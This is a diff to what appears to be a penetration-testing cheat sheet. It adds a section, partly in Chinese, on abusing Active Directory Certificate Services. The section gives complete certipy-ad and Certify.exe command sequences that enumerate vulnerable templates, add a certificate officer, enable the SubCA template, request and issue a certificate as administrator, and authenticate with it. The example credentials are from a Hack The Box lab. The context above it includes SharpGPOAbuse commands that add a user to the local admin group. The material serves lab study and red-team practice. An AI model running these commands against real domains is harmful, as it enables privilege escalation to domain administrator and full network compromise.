@@ -210,6 +210,33 @@ Abuse:
 ./SharpGPOAbuse.exe --AddLocalAdmin --UserAccount anirudh --GPOName "Default Domain Policy" (add anirudh to local admin group)
 gpupdate /force
 ```
+#### Abusing Active Directory Certificates
+Enumerating vulnerable certificates
+![image](https://github.com/KiritoLoveAsuna/Penetration-Testing/assets/38044499/39749455-0858-4ec2-aa17-320875ea1042)
+```
+certipy-ad find -u xxx -p xxxx -dc-ip xxx.xxx.xxx.xxx -stdout -vulnerable
+```
+Enumerating possible attackable certificates templates
+```
+./Certify.exe find /vulnerable
+```
+![image](https://github.com/KiritoLoveAsuna/Penetration-Testing/assets/38044499/15fbd1d2-130b-4604-89f3-11367d080dc5)
+
+使用“certipy-ad”与 Active Directory 证书服务进行交互，创建一个officer账户，用来授予在AD中管理证书和相关操作的权限。
+```
+certipy-ad ca -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.10.xxx.xxx -ca manager-dc01-ca --add-officer raven -debug
+```
+这边证书模板用的是之前Certify.exe枚举的结果，最终用的subca模板提权成功
+```
+certipy-ad ca -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.10.xxx.xxx -ca manager-dc01-ca -enable-template subca
+```
+![image](https://github.com/KiritoLoveAsuna/Penetration-Testing/assets/38044499/a54d71b4-b1c8-4b81-9568-3066a7acfa18)
+```
+certipy-ad req -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.10.xxx.xxx -ca manager-dc01-ca -template SubCA -upn administrator@manager.htb
+certipy-ad ca -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.10.xxx.xxx -ca manager-dc01-ca -issue-request 13
+certipy-ad req -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.10.xxx.xxx -ca manager-dc01-ca -retrieve 13
+certipy-ad auth -pfx administrator.pfx
+```
 ### Authentication
 #### Minikatz(require local admin)
 Load DemoEXE and run it locally.  
